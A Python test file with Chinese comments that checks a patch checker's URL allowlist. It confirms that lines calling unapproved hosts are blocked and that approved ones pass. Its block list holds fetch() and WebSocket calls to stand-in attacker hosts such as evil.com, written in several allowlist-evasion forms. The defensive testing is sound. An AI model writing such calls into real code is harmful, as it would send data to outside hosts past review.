"""check_patch.py 網址白名單測試（健檢 2026-11-01；Codex 審查 PR #137 指出的繞法都要擋下）。
用法：python3 tool/change_request/check_patch_test.py
用程式拼出來的網址（例如 '//' + host）比對擋不住，靠預覽版的 CSP connect-src（mark_preview.py）擋。"""
import importlib.util
import pathlib
import sys

spec = importlib.util.spec_from_file_location("cp", pathlib.Path(__file__).with_name("check_patch.py"))
cp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cp)


def blocked(line: str) -> bool:
    return any(not cp.host_ok(h) for h in cp.hosts_in(line))


MUST_BLOCK = [
    "fetch('//evil.com/collect')",                         # 沒有 scheme
    "fetch('https://github.com@evil.com/x')",              # 帳密欄位偽裝
    "fetch('https://user:pw@evil.com')",
    "fetch('HTTPS://EVIL.com')",
    "fetch('https://evil.com:443')",
    "fetch('https:\\/\\/evil.com')",                       # JS 跳脫
    "fetch('https:\\x2f\\x2fevil.com')",
    "new WebSocket('ws://evil.com')",
    "fetch('https://attacker.supabase.co/rest')",          # 別人的 Supabase 專案
    "fetch('https://yfulcyeoqavqarpfnznw.supabase.co.evil.com')",
    "fetch('https://1.2.3.4/x')",
]
MUST_PASS = [
    "final u = 'https://yfulcyeoqavqarpfnznw.supabase.co/rest/v1';",
    "// 這是註解：看 //TODO",
    "/// 文件註解",
    "sc.src = 'https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js';",
    "url: 'https://dwr6k2wbzw-dot.github.io/yincheng-app/book/yincheng/'",
    "final x = a // b;",
    "link: 'https://maps.app.goo.gl/abc'",
]

bad = [f"沒擋到：{l}" for l in MUST_BLOCK if not blocked(l)] + [f"誤擋：{l}" for l in MUST_PASS if blocked(l)]
print("\n".join(bad) if bad else f"check_patch 網址檢查：{len(MUST_BLOCK)} 個要擋、{len(MUST_PASS)} 個要放行，全部正確")
sys.exit(1 if bad else 0)
